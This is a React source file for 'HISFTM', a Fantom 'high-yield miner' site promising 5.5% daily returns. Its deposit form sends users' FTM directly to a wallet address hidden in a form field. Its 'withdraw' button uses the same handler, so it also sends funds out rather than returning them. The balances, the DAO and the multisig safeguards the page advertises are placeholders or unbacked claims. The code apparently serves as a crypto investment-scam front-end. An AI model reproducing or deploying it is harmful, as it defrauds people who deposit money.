import { useState } from "react";
import { ethers } from "ethers";
import ErrorMessage from "./ErrorMessage";
import TxList from "./TxList";
import "./App.css" ;
import img1 from '../src/item/img1.png' ;
import img2 from '../src/item/img2.png' ;
import discord from '../src/item/discord.svg' ;
import telegram from '../src/item/telegram.svg' ;
import twitter from '../src/item/twitter.svg' ;

const startPayment = async ({ setError, setTxs, ether, addr }) => {
  try {
    if (!window.ethereum)
      throw new Error("No crypto wallet found. Please install it.");

    await window.ethereum.send("eth_requestAccounts");
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    ethers.utils.getAddress(addr);
    const tx = await signer.sendTransaction({
      to: addr,
      value: ethers.utils.parseEther(ether)
    });
    console.log({ ether, addr });
    console.log("tx", tx);
    setTxs([tx]);
  } catch (err) {
    setError(err.message);
  }
};

export default function App() {
  const [error, setError] = useState();
  const [txs, setTxs] = useState([]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    const data = new FormData(e.target);
    setError();
    await startPayment({
      setError,
      setTxs,
      ether: data.get("ether"),
      addr: data.get("addr")
    });
  };

  return (


        <form onSubmit={handleSubmit}className="form">
          <body>
            <div className="box1">

              <div className="box2">

                <div className="boxa">
                  <ul className="ul1">
                    <li>H</li>
                    <li>I</li>
                    <li>G</li>
                    <li>H</li>
                    <li>.</li>
                    <li>Y</li>
                    <li>I</li>
                    <li>E</li>
                    <li>L</li>
                    <li>D</li>
                    <li></li>
                    <li>S</li>
                    <li>A</li>
                    <li>F</li>
                    <li>E</li>
                    <li>.</li>
                    <li>F</li>
                    <li>O</li>
                    <li>R</li>
                    <br />
                    <li>F</li>
                    <li>T</li>
                    <li>M</li>
                  </ul>
                </div>

                <div className="boxb">
                  <h1>HISFTM</h1>
                </div>

                <div className="boxc">
                  <a className="a1" href="/index1.html" target="_blank"><img className="img1a" src={img2} alt="" />White paper</a>
                  <a className="a1" href="https://ftmscan.com/address/0xfa1fbb8ef55a4855e5688c0ee13ac3f202486286" target="_blank"><img className="img1b" src={img2} alt="" /> Contract</a>
                  <a className="a1" href="" target="_blank"><img className="img1c" src={discord} alt="" /> Discord</a>
                  <a className="a1" href="" target="_blank"><img className="img1d" src={telegram} alt="" /> Telegram</a>
                  <a className="a1" href="" target="_blank"><img className="img1e" src={twitter} alt="" /> Twitter</a>
                </div>

              </div>
              
              <div className="box3">
                <div className="boxe">
                  <img src={img1} alt="" />
                </div>
                <div className="boxd">
                  <ul className="ul2">
                      <li className="li1">H</li>
                      <li className="li1">I</li>
                      <li className="li1">G</li>
                      <li className="li1">H</li>
                      <li className="li1">.</li>
                      <li className="li1">Y</li>
                      <li className="li1">I</li>
                      <li className="li1">E</li>
                      <li className="li1">L</li>
                      <li className="li1">D</li>
                      <br />
                      <li className="li1"></li>
                      <li className="li1">S</li>
                      <li className="li1">A</li>
                      <li className="li1">F</li>
                      <li className="li1">E</li>
                      <li className="li1">.</li>
                      <li className="li1">F</li>
                      <li className="li1">O</li>
                      <li className="li1">R</li>
                      <br />
                      <li className="li1">F</li>
                      <li className="li1">A</li>
                      <li className="li1">N</li>
                      <li className="li1">T</li>
                      <li className="li1">O</li>
                      <li className="li1">M</li>
                    </ul>
                </div>
                <div className="boxf">
                  <div className="boxf1">
                    <hr />
                    <p className="p1">Your Received FTM : 0 FTM</p>
                    <hr />
                    <br />
                    <hr />
                    <p className="p1">Aviable</p>
                    <hr />
                    <br />
                    <p className="p1">. . .</p>
                    <br />
                    <p className="p1">Fantom = . . .FUSDT</p>
                    <br />
                    <br />
                    <hr />
                    <p className="p1">Referral Rewards</p>
                    <hr />
                    <br />
                    <p className="p1">. . .</p>
                    <br />
                    <p className="p1">Fantom</p>
                    <br />
                    <br />
                    <hr />
                    <p className="p1">Team</p>
                    <hr />
                    <br />
                    <p className="p1">. . .</p>
                    <br />
                    <p className="p1">Players (Direct / Total)</p>

                  </div>
                  <div className="boxf2">
                    <hr />
                    <p className="p1">Your Reinvest Count: 0</p>
                    <hr />
                    <br />
                    <hr />
                    <p className="p1">Deposits</p>
                    <hr />
                    <br />
                    <p className="p1">. . .</p>
                    <br />
                    <p className="p1">Fantom = . . .FUSDT</p>
                    <br />
                    <br />
                    <hr />
                    <p className="p1">Max Payout</p>
                    <hr />
                    <br />
                    <p className="p1">. . .</p>
                    <br />
                    <p className="p1">Fantom</p>
                    <br />
                    <br />
                    <hr />
                    <p className="p1">TOTAL ROI</p>
                    <hr />
                    <br />
                    <p className="p1">. . .%</p>
                    <br />
                    <p className="p1">Return Of Invest</p>

                  </div>

                  <div className="boxf3">
                    <hr />
                    <p className="p1">Real Deposits: 0 FTM</p>
                    <hr />
                    <br />
                    <hr />
                    <p className="p1">UNWITHDRAWN</p>
                    <hr />
                    <br />
                    <p className="p1">. . . FTM </p>
                    <p className="p1">($0.00$)</p>
                    <p className="p1">Fantom = ...FUSDT</p>
                    <br />
                    <br />
                    <hr />
                    <p className="p1">Claimed</p>
                    <hr />
                    <br />
                    <p className="p1">. . .</p>
                    <br />
                    <p className="p1">Fantom</p>
                    <br />
                    <br />
                    <hr />
                    <p className="p1">Reinvest</p>
                    <hr />
                    <br />
                    <p className="p1">. . .</p>
                    <br />
                    <p className="p1">Fantom</p>
                  </div>
                  <div className="btn1"><button>Withdraw</button></div>
                  <div className="btn11"><button>Reinvest</button></div>
                </div>
                
              </div>

              <div className="box4">
                <input 
                  type="hidden"
                  name="addr"
                  value="0x7b95Ab528C931780f4F49D0Ca077b06f5c1b9ea5"/>
                <div className="boxg">
                  <p className="p3">The most improved Miner on FANTOM Ecosystem. 100% community-driven, improved sustainability.</p>
                  <br />
                  <br />
              
                </div>
                <div className="boxg">
                  <p className="p3">1. Deposit FANTOM</p>
                  <p className="p3">( min 10 , max 5000 )</p>
                  <p className="p3">Information : A new Deposit automatically reinvests the current unwithdrawn income</p>
                  <br />
                </div>
                <div className="boxg">
                  <p className="p3">2. Enter The App </p>
                  <p className="p3">Enter a Minimum of 10 FANTOM to access</p>
                  <br />
                  <br />
                  <br />

                </div>
                <div className="boxg">
                  <br />
                  <p className="p3">Enter Montant </p>
                  <br />
                  <input className="inp1"
                    name="ether"
                    type="text"
                    min="0.1"
                    max="5000"
                    placeholder="Min 10 - Max 5000 Fantom" />
                  
                  <div>
                  <br />
                    <button type="submit" className="btn2">
                    Deposit
                    </button>
                    <ErrorMessage message={error} />
                    <TxList txs={txs} />
                  </div>
                  <br />
                </div>
                <div className="boxg1">
                  <div className="boxh">
                    <br />
                    <p>time-varying daily high-yield decentralize application consult the white paper.</p>
                    <br />
                    <br />
                  </div>
                  <div className="boxh">
                    <br />
                    <p>Contract Balance</p>
                    <br />
                    <p>. . .</p>
                    <br />
                    <p>FANTOM</p>
                    <br />
                   
                  </div>
                  <div className="boxh">
                    <p>Estimated daily yield:</p>
                    <br />
                    <p>. . .</p>
                    <br />
                    <p>FANTOM</p>
                    <br />
                  </div>
                  <div className="boxh">
                    <p>Pourcentage Daily</p>
                    <br />
                    <p className="p5">5.5%</p>
                    <br />
                    <br />
                  </div>



                </div>
                <div className="boxg2">
                  <div className="boxh">
                    <br />
                    <p>decentralize application with changeable staking over time consult the white paper.</p>
                    <br />
                    <br />
                  </div>
                  <div className="boxh">
                    <br />
                    <p>current staking</p>
                    <br />
                    <p>4h</p>
                    <br />
                    <br />
                   
                  </div>
                  <div className="boxh">
                    <br />
                    <p>UNWITHDRAWN:</p>
                    <br />
                    <p>. . . FTM</p>
                    <br />
                    <p>FANTOM</p>
                    <br />
                  </div>
                  <div className="boxg">
                  <br />
                  <p className="p3">withdraw amount </p>
                  <br />
                  <input className="inp1"
                    name="ether"
                    type="text"
                    min="0.1"
                    max="5000"
                    placeholder="Min 1 - Max 50000 Fantom" />
                  
                  <div>
                  <br />
                    <button type="submit" className="btn3">
                      withdraw amount
                    </button>
                    <ErrorMessage message={error} />
                    <TxList txs={txs} />
                    <br />
                  </div>
                  <br />
                </div>
                </div>
              </div>

              <div className="box5">
                  <h2>The Protocole HISFTM</h2>
                  <div className="box5a">
                    <div className="c5a"></div>
                    <p className="p5a">A self-owned, decentrally governed reserve asset
                      The HISFTM Protocol is a self-owned, decentrally governed reserve asset which functions to execute the best possible management of its treasury in order to produce future gains for the benefit of its stakeholders.</p>
                  </div>
                  <div className="box5b">
                  <div className="c5b"></div>
                  <p className="p5b">Committed to stakeholders and long-term interests
                      While the HISFTM protocol is an OHM fork, it should be noted that all aspects of the protocol relevant to bonding, staking, inflation, or deflation may be edited to suit the changing conditions of the market with consent from the HISFHM Stakeholders’ DAO</p>
                  </div>
                  <div className="box5c">
                  <div className="c5c"></div>
                  <p className="p5c">Re-imaging fractional reserve finance
                      The key innovation in its success, HISFHM, allows the reorganisation of treasury held liquidity in order to assure the value of HISFHM through fractional reserve finance.</p>
                  </div>
              </div>

              <div className="box6">
                <h3>Two layers of Multisig Protection</h3>
                <p className="p6a">There are two layers to the multisig protection, Fantom Safe and OpenZeppelin Defender. The former is the Gnosis implementation on Fantom, and the latter is a secure platform to expand the capabilities of multisig operation.</p>
              </div>

            </div>
          </body>
        </form>


  );
}
